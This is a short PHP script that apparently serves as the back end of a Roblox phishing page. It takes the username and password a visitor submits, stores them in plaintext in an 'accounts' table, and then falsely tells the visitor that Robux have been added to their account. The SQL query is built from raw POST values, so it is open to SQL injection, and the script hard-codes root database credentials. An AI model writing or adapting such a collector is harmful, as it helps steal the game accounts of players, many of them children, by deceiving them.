<?php 
$con=new mysqli("192.168.254.109","root","root","roblox");

$username=$_POST['username'];
$password=$_POST['password'];

$sql="INSERT INTO accounts(username, password) VALUES('$username', '$password')";
$result=mysqli_query($con,$sql);
if($result=="true"){
 echo "<center><h2>Robux has successfully added to your account, check robux status <a href='a'>Status</a></h2></center>";
}
else{
 echo "<center><h2>Error..</h2></center>";
}
?>